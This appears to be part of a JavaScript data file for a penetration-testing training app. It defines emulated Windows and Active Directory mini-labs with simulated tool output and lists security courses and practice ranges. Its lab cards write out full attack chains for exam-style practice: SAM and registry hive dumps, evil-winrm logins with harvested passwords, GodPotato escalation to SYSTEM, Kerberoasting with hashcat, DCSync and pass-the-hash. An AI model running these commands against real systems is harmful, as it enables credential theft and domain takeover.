                cmd: 'rpcclient -U "" -N 10.10.10.60 -c "enumdomusers"',
                kind: 'deadend',
                terminalOutput:
                  'result was NT_STATUS_ACCESS_DENIED',
                suppressNote: 'Checked & Ruled Out: Anonymous RPC `enumdomusers` is restricted (`NT_STATUS_ACCESS_DENIED`) on this host. OBOL suppresses this card so you can focus on SMB file shares (Card #1)!'
              },
              {
                id: 'nxc-sam-guest',
                rank: '#3',
                color: '#f59e0b',
                title: 'Attempt Guest SAM Hive Dump (NetExec)',
                why: 'Tests Guest authentication and attempts to dump local SAM hashes.',
                fieldNote: 'nxc smb --sam requires Local Administrator privileges on the target.',
                cmd: 'nxc smb 10.10.10.60 -u \'guest\' -p \'\' --sam',
                kind: 'doctor',
                terminalOutput:
                  'SMB         10.10.10.60     445    FILES01          [*] Windows Server 2022 Build 20348 x64 (name:FILES01) (domain:corp.local)\n' +
                  'SMB         10.10.10.60     445    FILES01          [-] corp.local\\guest: STATUS_ACCESS_DENIED',
                doctor: {
                  title: 'Field Doctor: STATUS_ACCESS_DENIED (SAM Dump Requires Admin)',
                  diagnosis: 'Dumping the SAM hive (`--sam`) requires Local Administrator access (`Pwn3d!`). Unauthenticated/Guest sessions cannot read `ADMIN$`.',
                  fix: 'Use Card #1 (`smbclient -N -L //10.10.10.60`) to inspect readable SMB shares for user credentials first!'
                }
              }
            ]
          },
          {
            phase: 'Phase 3 of 4: Initial Foothold',
            title: 'Gain a Windows Shell With svc_deploy (3 Plausible Moves)',
            prompt: 'OBOL pre-filled `svc_deploy` and `Deploy#2026!` into your candidate foothold moves. Test them below.',
            knownFacts: ['credential.available: svc_deploy:Deploy#2026!', 'winrm.reachable: 5985/tcp'],
            cards: [
              {
                id: 'evil-winrm-foot',
                rank: '#1',
                color: '#10b981',
                title: 'WinRM Shell via Evil-WinRM (Port 5985)',
                why: 'Connects over Windows Remote Management (5985/tcp) as svc_deploy, checks privileges, and reads local.txt.',
                fieldNote: '-i target IP | -u username | -p password. Runs whoami /all to inspect token privileges immediately.',
                cmd: 'evil-winrm -i 10.10.10.60 -u \'svc_deploy\' -p \'Deploy#2026!\'',
                kind: 'advance',
                terminalOutput:
                  'Info: Establishing connection to remote endpoint\n' +
                  '*Evil-WinRM* PS C:\\Users\\svc_deploy\\Documents> whoami /all\n' +
                  'User Name        SID\n' +
                  '================ =============================================\n' +
                  'corp\\svc_deploy  S-1-5-21-192837465-1122334455-99887766-1104\n\n' +
                  'Privilege Name                Description                               State\n' +
                  '============================= ========================================= =======\n' +
                  'SeImpersonatePrivilege        Impersonate a client after authentication Enabled\n' +
                  '*Evil-WinRM* PS C:\\Users\\svc_deploy\\Documents> type C:\\Users\\svc_deploy\\Desktop\\local.txt\n' +
                  '11223344556677889900aabbccddeeff',
                mintedFacts: [
                  { kind: 'winrm.authenticated', detail: 'svc_deploy@10.10.10.60' },
                  { kind: 'foothold.windows', detail: 'PowerShell session as corp\\svc_deploy' },
                  { kind: 'privesc.potato_candidate', detail: 'SeImpersonatePrivilege Enabled' },
                  { kind: 'objective.local_flag', detail: '11223344556677889900aabbccddeeff' }
                ],
                explain: {
                  whatHappened: '`evil-winrm` connected over Port 5985, captured `local.txt`, and `whoami /all` revealed `SeImpersonatePrivilege Enabled`!',
                  howObolHelped: 'OBOL spotted `SeImpersonatePrivilege` in your paste and promoted **GodPotato / PrintSpoofer Token Impersonation** to the #1 PrivEsc move.',
                  featureSpotlight: 'Instant PrivEsc Detection: Paste `whoami /all` or `winPEAS` and OBOL highlights the exact escalation path.'
                }
              },
              {
                id: 'psexec-admin-denied',
                rank: '#2',
                color: '#f59e0b',
                title: 'Attempt Impacket PsExec Service Shell',
                why: 'Attempts to upload a service binary to ADMIN$ for an immediate SYSTEM shell.',
                fieldNote: 'Requires write access to ADMIN$ (Local Administrator).',
                cmd: 'impacket-psexec corp.local/svc_deploy:\'Deploy#2026!\'@10.10.10.60',
                kind: 'doctor',
                terminalOutput:
                  'Impacket v0.12.0 - Copyright Fortra, LLC\n' +
                  '[*] Requesting shares on 10.10.10.60.....\n' +
                  '[-] share \'ADMIN$\' is not writable.\n' +
                  '[-] share \'C$\' is not writable.',
                doctor: {
                  title: 'Field Doctor: ADMIN$ Not Writable (Non-Admin WinRM User)',
                  diagnosis: '`impacket-psexec` requires Local Administrator rights (`ADMIN$` write access). `svc_deploy` is in `Remote Management Users`, not `Administrators`.',
                  fix: 'Use Card #1 (`evil-winrm` on Port 5985) to land a standard user shell first, then escalate from inside!'
                }
              },
              {
                id: 'smb-extra-shares',
                rank: '#3',
                color: '#3b82f6',
                title: 'Re-Check SMB Shares With Authenticated User (nxc)',
                why: 'Checks if authenticating as svc_deploy unlocks any additional file shares beyond IT_Backups.',
                fieldNote: '--shares lists read/write permissions for svc_deploy.',
                cmd: 'nxc smb 10.10.10.60 -u \'svc_deploy\' -p \'Deploy#2026!\' --shares',
                kind: 'deadend',
                terminalOutput:
                  'SMB         10.10.10.60     445    FILES01          [+] corp.local\\svc_deploy:Deploy#2026!\n' +
                  'SMB         10.10.10.60     445    FILES01          Share           Permissions     Remark\n' +
                  'SMB         10.10.10.60     445    FILES01          ADMIN$                          Remote Admin\n' +
                  'SMB         10.10.10.60     445    FILES01          C$                              Default share\n' +
                  'SMB         10.10.10.60     445    FILES01          IPC$            READ            Remote IPC\n' +
                  'SMB         10.10.10.60     445    FILES01          IT_Backups      READ            Staging scripts',
                suppressNote: 'Checked & Ruled Out: Authenticated SMB share listing confirmed `svc_deploy` has no new shares (`ADMIN$` and `C$` are not readable). OBOL suppresses this card and points you to Card #1 (`evil-winrm` on Port 5985)!'
              }
            ]
          },
          {
            phase: 'Phase 4 of 4: Privilege Escalation & Proof',
            title: 'Escalate to NT AUTHORITY\\SYSTEM (3 Plausible Moves)',
            prompt: 'You have a PowerShell foothold as `corp\\svc_deploy` with `SeImpersonatePrivilege Enabled`. Test the 3 Windows PrivEsc cards below to become `SYSTEM` and capture `proof.txt`.',
            knownFacts: ['foothold.windows: corp\\svc_deploy', 'privesc.potato_candidate: SeImpersonatePrivilege'],
            cards: [
              {
                id: 'godpotato-sys',
                rank: '#1',
                color: '#10b981',
                title: 'Abuse SeImpersonatePrivilege With GodPotato',
                why: 'Uses GodPotato to impersonate a SYSTEM token over RPC/DCOM and execute commands as NT AUTHORITY\\SYSTEM.',
                fieldNote: '-cmd passes the command to execute as SYSTEM. Includes whoami + ipconfig + proof.txt for exam-ready proof.',
                cmd: '.\\GodPotato-NET4.exe -cmd "cmd /c whoami && ipconfig && type C:\\Users\\Administrator\\Desktop\\proof.txt"',
                kind: 'advance',
                terminalOutput:
                  '[*] CombaseModule: 0x140729182945280\n' +
                  '[*] Find System Token : True\n' +
                  '[*] ImpersonateLoggedOnUser : True\n' +
                  'nt authority\\system\n' +
                  'Windows IP Configuration\n' +
                  'Ethernet adapter Ethernet0:\n' +
                  '   IPv4 Address. . . . . . . . . . . : 10.10.10.60\n' +
                  '99887766554433221100ffeeddccbbaa',
                mintedFacts: [
                  { kind: 'access.system', detail: 'nt authority\\system achieved via GodPotato' },
                  { kind: 'objective.root_flag', detail: '99887766554433221100ffeeddccbbaa (proof.txt)' }
                ],
                explain: {
                  whatHappened: '`GodPotato` impersonated `nt authority\\system` and captured `proof.txt` alongside `whoami` and `ipconfig`!',
                  howObolHelped: 'OBOL\'s Loadout (`#/loadout`) pre-stages `GodPotato-NET4.exe` and `PrintSpoofer64.exe` in `/opt/obol-tools/windows/` on your Kali machine.',
                  featureSpotlight: 'Pre-Staged Windows Binaries: Never waste exam time hunting GitHub for compiled `.exe` privilege escalation tools.'
                }
              },
              {
                id: 'unquoted-svc-check',
                rank: '#2',
                color: '#3b82f6',
                title: 'Audit Unquoted Service Paths (wmic)',
                why: 'Checks if any auto-start Windows services have unquoted spaces in their binary path.',
                fieldNote: 'Filters out standard C:\\Windows\\ services to spot third-party unquoted paths.',
                cmd: 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\\\"',
                kind: 'deadend',
                terminalOutput:
                  'VGAuthService  VMware Alias Manager and Ticket Service  "C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\VGAuthService.exe"  Auto',
                suppressNote: 'Checked & Ruled Out: All non-Windows service paths are properly enclosed in double quotes. OBOL suppresses this card so you can focus on Card #1 (`GodPotato`)!'
              },
              {
                id: 'reg-save-denied',
                rank: '#3',
                color: '#f59e0b',
                title: 'Attempt Direct HKLM\\SAM Registry Dump',
                why: 'Tries saving the SAM registry hive directly from the current svc_deploy shell.',
                fieldNote: 'reg save HKLM\\SAM requires an active Administrator/SYSTEM token.',
                cmd: 'reg save HKLM\\SAM C:\\Temp\\sam.bak',
                kind: 'doctor',
                terminalOutput:
                  'ERROR: Access is denied.',
                doctor: {
                  title: 'Field Doctor: Registry Hive Save Denied (Not SYSTEM Yet)',
                  diagnosis: 'Even though `svc_deploy` holds `SeImpersonatePrivilege`, your shell is still running as a standard user until you use a Potato tool to impersonate SYSTEM.',
                  fix: 'Run Card #1 (`.\\GodPotato-NET4.exe`) to execute commands as `nt authority\\system`!'
                }
              }
            ]
          }
        ]
      },
      {
        id: 'ad-dc',
        title: 'Mini-Lab 3: Active Directory Domain Controller',
        badge: 'OSCP 40-Pt AD / CPTS',
        color: '#f59e0b',
        os: 'Windows Server 2022 DC',
        target: '10.10.10.70',
        hostname: 'dc01.corp.local',
        summary: 'Compromise an Active Directory Domain Controller (10.10.10.70). Fingerprint AD with Nmap, enumerate users over SMB, diagnose Kerberos clock skew with Field Doctor, and DCSync the domain.',
        steps: [
          {
            phase: 'Phase 1 of 4: Recon',
            title: 'Scan the Cold Target (10.10.10.70)',
            prompt: 'Copy the opening Nmap scan from Card #1, run it in the emulated terminal, and paste the output back into OBOL to see if 10.10.10.70 is a Domain Controller.',
            knownFacts: ['target: 10.10.10.70'],
            cards: [
              {
                id: 'nmap-dc',
                rank: '#1',
                color: '#06b6d4',
                title: 'Nmap TCP Service & Default Script Scan',
                why: 'Probes TCP ports and extracts Active Directory domain and hostname metadata from LDAP/Kerberos banners.',
                fieldNote: 'Port 88 (Kerberos) and Port 389 (LDAP) immediately identify an Active Directory Domain Controller.',
                cmd: 'nmap -sC -sV -Pn 10.10.10.70',
                kind: 'advance',
                terminalOutput:
                  'Starting Nmap 7.94SVN ( https://nmap.org )\n' +
                  'Nmap scan report for dc01.corp.local (10.10.10.70)\n' +
                  'Host is up (0.024s latency).\n' +
                  'PORT     STATE SERVICE       VERSION\n' +
                  '53/tcp   open  domain        Simple DNS Plus\n' +
                  '88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-20 18:10:02Z)\n' +
                  '135/tcp  open  msrpc         Microsoft Windows RPC\n' +
                  '389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: corp.local0., Site: Default-First-Site-Name)\n' +
                  '445/tcp  open  microsoft-ds?\n' +
                  '5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n' +
                  'Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows',
                mintedFacts: [
                  { kind: 'ports.open', detail: '53 (DNS), 88 (Kerberos), 135, 389 (LDAP), 445 (SMB), 5985 (WinRM)' },
                  { kind: 'ad.dc_candidate', detail: 'DC01 (Domain: corp.local)' },
                  { kind: 'host.domain', detail: 'corp.local' }
                ],
                explain: {
                  whatHappened: 'Ports 53, 88, and 389 confirm `10.10.10.70` is an Active Directory Domain Controller (`DC01.corp.local`).',
                  howObolHelped: 'OBOL automatically cleaned `corp.local0.` to `corp.local`, set `{{domain}}`, and unlocked 3 unauthenticated AD enumeration moves!',
                  featureSpotlight: 'Automatic AD Domain Extraction: OBOL populates `{{domain}}` (`corp.local`) and `{{dc_ip}}` (`10.10.10.70`) from Nmap LDAP output.'
                }
              }
            ]
          },
          {
            phase: 'Phase 2 of 4: Enumeration',
            title: 'Unauthenticated AD Enumeration (3 Plausible Moves)',
            prompt: 'With no credentials yet on `corp.local`, OBOL surfaces 3 unauthenticated Active Directory checks: SMB/RPC user enumeration, anonymous LDAP bind, and AS-REP roasting.',
            knownFacts: ['ad.dc_candidate: DC01', 'host.domain: corp.local', 'ports.open: 53, 88, 389, 445, 5985'],
            cards: [
              {
                id: 'nxc-users',
                rank: '#1',
                color: '#10b981',
                title: 'Enumerate Domain Users & Descriptions via SMB (NetExec)',
                why: 'Lists domain users and checks account description fields for leaked temporary passwords.',
                fieldNote: '-u \'\' -p \'\' uses a null session | --users dumps domain accounts and their LDAP description strings.',
                cmd: 'nxc smb 10.10.10.70 -u \'\' -p \'\' --users',
                kind: 'advance',
                terminalOutput:
                  'SMB         10.10.10.70     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:corp.local)\n' +
                  'SMB         10.10.10.70     445    DC01             [+] Enumerated domain user(s)\n' +
                  'SMB         10.10.10.70     445    DC01             corp.local\\Administrator          Built-in account for administering the computer/domain\n' +
                  'SMB         10.10.10.70     445    DC01             corp.local\\svc_sql                SQL Reporting (Temp pass: SqlStart2026!)\n' +
                  'SMB         10.10.10.70     445    DC01             corp.local\\svc_krb                Kerberos Tier-0 Replication Service',
                mintedFacts: [
                  { kind: 'ad.user_list', detail: 'Administrator, svc_sql, svc_krb' },
                  { kind: 'credential.available', detail: 'corp.local\\svc_sql : SqlStart2026! (from description)' }
                ],
                explain: {
                  whatHappened: '`nxc smb --users` enumerated 3 domain users and found a password (`SqlStart2026!`) left in `svc_sql`\'s description field!',
                  howObolHelped: 'OBOL extracted both the user list and `svc_sql : SqlStart2026!`, unlocking authenticated Kerberoasting and BloodHound collection.',
                  featureSpotlight: 'Description Credential Harvester: OBOL scans LDAP/SMB user descriptions for leaked passwords automatically.'
                }
              },
              {
                id: 'ldap-anon-bind',
                rank: '#2',
                color: '#3b82f6',
                title: 'Test Anonymous LDAP Directory Query (ldapsearch)',
                why: 'Checks if LDAP (Port 389) allows unauthenticated queries against DC=corp,DC=local.',
                fieldNote: '-x uses simple auth without credentials | -b sets the search base DN.',
                cmd: 'ldapsearch -x -H ldap://10.10.10.70 -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName',
                kind: 'deadend',
                terminalOutput:
                  '# extended LDIF\n' +
                  '# numResponses: 1\n' +
                  'result: 1 Operations error\n' +
                  'text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563',
                suppressNote: 'Checked & Ruled Out: Anonymous LDAP bind is disabled (`000004DC: a successful bind must be completed`). OBOL suppresses unauthenticated LDAP queries and directs you to SMB RPC user enumeration (Card #1)!'
              },
              {
                id: 'secretsdump-anon',
                rank: '#3',
                color: '#f59e0b',
                title: 'Attempt Unauthenticated DCSync (impacket-secretsdump)',
                why: 'Attempts to dump domain hashes without credentials.',
                fieldNote: 'DCSync requires Replicating Directory Changes privileges (typically Domain Admin).',
                cmd: 'impacket-secretsdump anonymous:\'\'@10.10.10.70',
                kind: 'doctor',
                terminalOutput:
                  'Impacket v0.12.0 - Copyright Fortra, LLC\n' +
                  '[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied',
                doctor: {
                  title: 'Field Doctor: rpc_s_access_denied (DCSync Requires Domain Admin)',
                  diagnosis: '`secretsdump` cannot replicate domain hashes without Domain Admin or replication rights.',
                  fix: 'Run Card #1 (`nxc smb 10.10.10.70 -u \'\' -p \'\' --users`) to enumerate domain accounts first!'
                }
              }
            ]
          },
          {
            phase: 'Phase 3 of 4: Service Ticket Attack (Kerberoasting)',
            title: 'Kerberoast With svc_sql (3 Plausible Moves)',
            prompt: 'You now have a valid domain user (`svc_sql : SqlStart2026!`). Try the 3 moves below (including Card #2 to see how OBOL\'s Field Doctor handles the classic Kerberos `KRB_AP_ERR_SKEW` clock error!).',
            knownFacts: ['credential.available: corp.local\\svc_sql:SqlStart2026!', 'ad.user_list: 3 users'],
            cards: [
              {
                id: 'kerberoast-ok',
                rank: '#1',
                color: '#10b981',
                title: 'Sync Clock, Kerberoast SPNs & Crack Ticket (GetUserSPNs + hashcat)',
                why: 'Syncs local clock with the DC, requests TGS tickets for service accounts with SPNs, and cracks them offline with Hashcat mode 13100.',
                fieldNote: 'ntpdate aligns Kerberos timestamps | -request fetches $krb5tgs$ hash | hashcat -m 13100 cracks Kerberos 5 TGS-REP etype 23.',
                cmd: 'sudo ntpdate 10.10.10.70 && impacket-GetUserSPNs corp.local/svc_sql:\'SqlStart2026!\' -dc-ip 10.10.10.70 -request && hashcat -m 13100 krb5tgs.hash /usr/share/wordlists/rockyou.txt --quiet',
                kind: 'advance',
                terminalOutput:
                  '2026-04-20 18:12:04 (+0000) +1420.004128 +/- 0.012s 10.10.10.70 s1 no-leap\n' +
                  'ServicePrincipalName          Name     MemberOf                               PasswordLastSet\n' +
                  '----------------------------  -------  -------------------------------------  -------------------\n' +
                  'REPL/dc01.corp.local          svc_krb  CN=Domain Admins,CN=Users,DC=corp...   2025-11-04 09:14:22\n' +
                  '$krb5tgs$23$*svc_krb$CORP.LOCAL$corp.local/svc_krb*$a1b2c3d4e5f60718293a4b5c6d7e8f90$11223344556677889900aabbccddeeff...\n' +
                  '$krb5tgs$23$*svc_krb$CORP.LOCAL$corp.local/svc_krb*$a1b2c3d4e5f60718293a4b5c6d7e8f90:KrbMaster#99',
                mintedFacts: [
                  { kind: 'ad.kerberoastable', detail: 'svc_krb (REPL/dc01.corp.local)' },
                  { kind: 'hash.krb5tgs', detail: '$krb5tgs$23$*svc_krb$...' },
                  { kind: 'credential.available', detail: 'corp.local\\svc_krb : KrbMaster#99 (cracked TGS)' }
                ],
                explain: {
                  whatHappened: 'You synced your clock to DC01, Kerberoasted `svc_krb`, and cracked its password (`KrbMaster#99`)!',
                  howObolHelped: 'OBOL promoted `svc_krb : KrbMaster#99` to your active credential and unlocked Domain Admin / DCSync moves.',
                  featureSpotlight: 'Hash-to-Cleartext Chain: OBOL tracks cracked hashes and updates every downstream command with the new password.'
                }
              },
              {
                id: 'kerberoast-skew-trap',
                rank: '#2',
                color: '#f59e0b',
                title: 'Run GetUserSPNs Without Syncing Clock First',
                why: 'Requests Kerberos service tickets directly before syncing Kali\'s system clock with the Domain Controller.',
                fieldNote: 'Kerberos rejects requests if client and DC clocks differ by more than 5 minutes.',
                cmd: 'impacket-GetUserSPNs corp.local/svc_sql:\'SqlStart2026!\' -dc-ip 10.10.10.70 -request',
                kind: 'doctor',
                terminalOutput:
                  'Impacket v0.12.0 - Copyright Fortra, LLC\n' +
                  '[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)',
                doctor: {
                  title: 'Field Doctor: KRB_AP_ERR_SKEW (Kerberos Clock Skew Too Great)',
                  diagnosis: 'Active Directory Kerberos rejected the ticket request because your Kali clock differs from DC01\'s clock by more than 5 minutes.',
                  fix: 'Run `sudo ntpdate 10.10.10.70` first! Use Card #1 (which syncs the clock with `ntpdate` and then runs `GetUserSPNs`).'
                }
              },
              {
                id: 'asrep-roast-empty',
                rank: '#3',
                color: '#3b82f6',
                title: 'Check for AS-REP Roastable Users (GetNPUsers)',
                why: 'Checks if any domain user has Kerberos Pre-Authentication disabled (DONT_REQ_PREAUTH).',
                fieldNote: 'GetNPUsers queries LDAP for userAccountControl & 0x400000.',
                cmd: 'impacket-GetNPUsers corp.local/svc_sql:\'SqlStart2026!\' -dc-ip 10.10.10.70 -request',
                kind: 'deadend',
                terminalOutput:
                  'Impacket v0.12.0 - Copyright Fortra, LLC\n' +
                  '[*] No entries found!',
                suppressNote: 'Checked & Ruled Out: `No entries found!` means no users have Kerberos Pre-Authentication disabled on `corp.local`. OBOL suppresses AS-REP Roasting so you can focus on Kerberoasting (Card #1)!'
              }
            ]
          },
          {
            phase: 'Phase 4 of 4: Domain Compromise & Proof',
            title: 'DCSync & Capture Both Flags on DC01 (3 Plausible Moves)',
            prompt: 'You cracked `svc_krb : KrbMaster#99` (a member of `Domain Admins`). Use the cards below to dump the Administrator hash, log in via Pass-the-Hash, and capture `local.txt` and `proof.txt`.',
            knownFacts: ['credential.available: corp.local\\svc_krb:KrbMaster#99', 'ad.dc_candidate: DC01'],
            cards: [
              {
                id: 'dcsync-winrm',
                rank: '#1',
                color: '#10b981',
                title: 'DCSync Administrator Hash & WinRM Pass-the-Hash',
                why: 'Uses svc_krb\'s replication privileges to dump the Administrator NTLM hash and logs in via Evil-WinRM to capture both flags.',
                fieldNote: '-just-dc-user Administrator replicates only the target account | evil-winrm -H authenticates directly with the NTLM hash.',
                cmd: 'impacket-secretsdump corp.local/svc_krb:\'KrbMaster#99\'@10.10.10.70 -just-dc-user Administrator && evil-winrm -i 10.10.10.70 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6',
                kind: 'advance',
                terminalOutput:
                  'Impacket v0.12.0 - Copyright Fortra, LLC\n' +
                  '[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n' +
                  'corp.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::\n' +
                  '*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> whoami && ipconfig && type C:\\Users\\svc_sql\\Desktop\\local.txt && type C:\\Users\\Administrator\\Desktop\\proof.txt\n' +
                  'corp\\administrator\n' +
                  '   IPv4 Address. . . . . . . . . . . : 10.10.10.70\n' +
                  'abcdef0123456789abcdef0123456789\n' +
                  'fedcba9876543210fedcba9876543210',
                mintedFacts: [
                  { kind: 'hash.ntlm', detail: 'Administrator : 32693b11e6aa90eb43d32c72a07ceea6' },
                  { kind: 'access.admin', detail: 'Domain Admin shell on DC01' },
                  { kind: 'objective.local_flag', detail: 'abcdef0123456789abcdef0123456789' },
                  { kind: 'objective.root_flag', detail: 'fedcba9876543210fedcba9876543210' }
                ],
                explain: {
                  whatHappened: '`secretsdump` replicated the `Administrator` NTLM hash (`32693b11...`), and `evil-winrm -H` logged straight in via Pass-the-Hash to capture both flags!',
                  howObolHelped: 'Whenever OBOL parses an NTLM hash from `secretsdump`, it unlocks Pass-the-Hash (`-H` / `--hashes`) across every Windows target in the domain.',
                  featureSpotlight: 'Full Domain Compromise: Both `local.txt` and `proof.txt` are verified and ready for `#/report`!'
                }
              },
              {
                id: 'adcs-check-none',
                rank: '#2',
                color: '#3b82f6',
                title: 'Check for Vulnerable ADCS Certificate Templates (certipy)',
                why: 'Enumerates Active Directory Certificate Services to see if any ESC1-ESC8 templates exist.',
                fieldNote: 'certipy find -vulnerable queries LDAP for PKI Enrollment Services.',
                cmd: 'certipy find -u svc_krb@corp.local -p \'KrbMaster#99\' -dc-ip 10.10.10.70 -vulnerable -stdout',
                kind: 'deadend',
                terminalOutput:
                  'Certipy v4.8.2 - by Oliver Lyak (ly4k)\n' +
                  '[*] Finding certificate templates\n' +
                  '[!] Found 0 enabled certificate authorities.',
                suppressNote: 'Checked & Ruled Out: `Found 0 enabled certificate authorities` means ADCS is not installed on this domain. OBOL suppresses ADCS attacks and directs you to Card #1 (`impacket-secretsdump` DCSync)!'
              },
              {
                id: 'ssh-dc-refused',
                rank: '#3',
                color: '#f59e0b',
                title: 'Attempt SSH Login to DC01',
                why: 'Tests whether OpenSSH is running on Port 22 on the Domain Controller.',
                fieldNote: 'Windows Domain Controllers typically use WinRM (5985) or SMB (445) rather than SSH (22).',
                cmd: 'ssh svc_krb@10.10.10.70',
                kind: 'doctor',
                terminalOutput:
                  'ssh: connect to host 10.10.10.70 port 22: Connection refused',
                doctor: {
                  title: 'Field Doctor: Port 22 Closed on Windows DC',
                  diagnosis: 'Port 22 (SSH) is closed on `DC01`. Windows Domain Controllers are managed via WinRM (Port 5985) and SMB/RPC (Port 445).',
                  fix: 'Run Card #1 (`impacket-secretsdump` + `evil-winrm` on Port 5985)!'
                }
              }
            ]
          }
        ]
      }
    ],

    // Keep dryRun alias pointing to miniLabs so any legacy consumer sees >= 3 items.
    dryRun: [
      { id: 'linux-web', label: 'Linux Web Server (10.10.10.50)', target: '10.10.10.50' },
      { id: 'windows-smb', label: 'Windows File Server (10.10.10.60)', target: '10.10.10.60' },
      { id: 'ad-dc', label: 'Active Directory DC (10.10.10.70)', target: '10.10.10.70' }
    ],

    // Structured Guided Courses with semantic spectrum colors by cost/tier:
    //   #10b981 (Emerald) = 100% Free Forever
    //   #06b6d4 (Cyan)    = Free Starter Tier + Optional Subscription
    //   #a855f7 (Violet)  = Paid Monthly Subscription
    //   #f59e0b (Gold)    = Official Certification / Enterprise Track
    courses: [
      {
        name: 'PortSwigger Web Security Academy',
        url: 'https://portswigger.net/web-security',
        cost: '100% Free forever',
        free: true,
        color: '#10b981',
        badge: '100% Free Browser Labs',
        blurb: 'The gold standard for web application security (SQL injection, XSS, SSRF, XXE, JWT, SSTI, Deserialization). Every topic has clear explanations and free live browser labs you can solve right now.'
      },
      {
        name: 'OverTheWire (Bandit & Natas) + pwn.college',
        url: 'https://overthewire.org/wargames/bandit/',
        cost: '100% Free forever',
        free: true,
        color: '#10b981',
        badge: '100% Free CLI Wargame',
        blurb: 'Never used the Linux command line or SSH? Bandit teaches Linux navigation, permissions, and piping one small level at a time over SSH. Natas does the same for web basics, and pwn.college covers system security.'
      },
      {
        name: 'TryHackMe Learning Paths',
        url: 'https://tryhackme.com/r/hacktivities',
        cost: 'Free starter rooms; Premium ~$14/mo',
        free: true,
        color: '#06b6d4',
        badge: 'Free Tier + Browser VM',
        blurb: 'Guided, bite-sized rooms with an in-browser AttackBox terminal (zero VM setup required). Start with the Pre-Security, Complete Beginner, and Jr Penetration Tester paths, then graduate to Offensive Pentesting.'
      },
      {
        name: 'HTB Academy',
        url: 'https://academy.hackthebox.com/',
        cost: 'Free starter modules; Student ~$8/mo; Silver ~$18/mo',
        free: true,
        color: '#06b6d4',
        badge: 'Free Tier + Pwnbox',
        blurb: 'Deep, structured modules with live target questions at the end of every section. The Penetration Tester Job Role Path directly prepares you for the CPTS exam and transfers cleanly to OSCP.'
      },
      {
        name: 'TCM Security Academy (PEH)',
        url: 'https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course',
        cost: 'All-Access ~$30/mo (frequent sales)',
        free: false,
        color: '#a855f7',
        badge: 'Monthly Sub + Home AD Lab',
        blurb: 'Practical Ethical Hacking (PEH) by Heath Adams: plain-English video walkthroughs of networking, Linux, web, and building your own Active Directory lab from scratch. The official foundation for the PNPT exam.'
      },
      {
        name: 'OffSec PEN-200 (OSCP Official Course)',
        url: 'https://www.offsec.com/courses/pen-200/',
        cost: 'Course + 90d labs + 1 exam attempt from ~$1,749',
        free: false,
        color: '#f59e0b',
        badge: 'Official OSCP Track',
        blurb: 'OffSec\'s official Penetration Testing with Kali Linux curriculum and Challenge Labs (Medtech, Relia, Skylark, and OSCP A/B/C practice sets). Best taken after you already have solid fundamentals from HTB/THM/TCM.'
      },
      {
        name: 'SANS SEC560 (GPEN)',
        url: 'https://www.sans.org/cyber-security-courses/enterprise-penetration-testing/',
        cost: 'Employer-funded (~$8,500+)',
        free: false,
        color: '#f59e0b',
        badge: 'Enterprise Sponsored',
        blurb: 'Instructor-led enterprise penetration testing course paired with the GIAC GPEN certification. Worth taking when an employer or scholarship is covering tuition.'
      }
    ],

    // Live Target Practice Ranges (each card has a distinct vibrant full-spectrum color).
    practice: [
      {
        name: 'OverTheWire: Bandit & Natas',
        url: 'https://overthewire.org/wargames/',
        cost: '100% Free forever',
        free: true,
        color: '#10b981',
        badge: '100% Free CLI & Web Wargames',
        blurb: 'Classic progressive wargames: Bandit teaches Linux navigation, permissions, cron jobs, SUID binaries, and Git over SSH (Levels 0 to 34); Natas teaches server-side web vulnerabilities level by level.'
      },
      {
        name: 'UnderTheWire (PowerShell Wargames)',
        url: 'https://underthewire.tech/',
        cost: '100% Free forever',
        free: true,
        color: '#3b82f6',
        badge: '100% Free Windows & AD CLI',
        blurb: 'The Windows PowerShell counterpart to OverTheWire. Connect over SSH to progressive Windows servers (Century, Cyborg, Groot, Oracle) to master PowerShell enumeration, WMI, registry, and Active Directory queries.'
      },
      {
        name: 'PortSwigger Web Security Academy Labs',
        url: 'https://portswigger.net/web-security/all-labs',
        cost: '100% Free forever',
        free: true,
        color: '#f97316',
        badge: '100% Free 250+ Live Web Labs',
        blurb: 'Spin up disposable live web application targets in your browser for SQLi, XSS, SSRF, XXE, Deserialization, OAuth, JWT, SSTI, and HTTP Request Smuggling with Apprentice, Practitioner, and Expert tiers.'
      },
      {
        name: 'PicoCTF / picoGym Practice Range',
        url: 'https://play.picoctf.org/practice',
        cost: '100% Free forever',
        free: true,
        color: '#a855f7',
        badge: '100% Free Browser Wargame Range',
        blurb: 'Maintained by Carnegie Mellon University: an always-open practice range with hundreds of beginner-to-advanced challenges across Web Exploitation, Binary Exploitation, Cryptography, Reverse Engineering, and Forensics, complete with a free browser webshell.'
      },
      {
        name: 'VulnHub (Local Offline VMs)',
        url: 'https://www.vulnhub.com/',
        cost: '100% Free downloads forever',
        free: true,
        color: '#06b6d4',
        badge: '100% Free Local VMs',
        blurb: 'Downloadable .ova virtual machines you import into VirtualBox or VMware on your own computer. Runs completely offline on your private Host-Only network with zero subscriptions or VPN latency.'
      },
      {
        name: 'HackMyVM (Community VMs & Range)',
        url: 'https://hackmyvm.eu/',
        cost: '100% Free downloads & online tier',
        free: true,
        color: '#ec4899',
        badge: '100% Free Boot-to-Root VMs',
        blurb: 'Actively maintained community repository of hundreds of downloadable Linux and Windows boot-to-root virtual machines (Easy, Medium, and Hard), plus a free online VPN/browser lab range.'
      },
      {
        name: 'GOAD (Game of Active Directory)',
        url: 'https://github.com/Orange-Cyberdefense/GOAD',
        cost: '100% Free open-source lab',
        free: true,
        color: '#f43f5e',
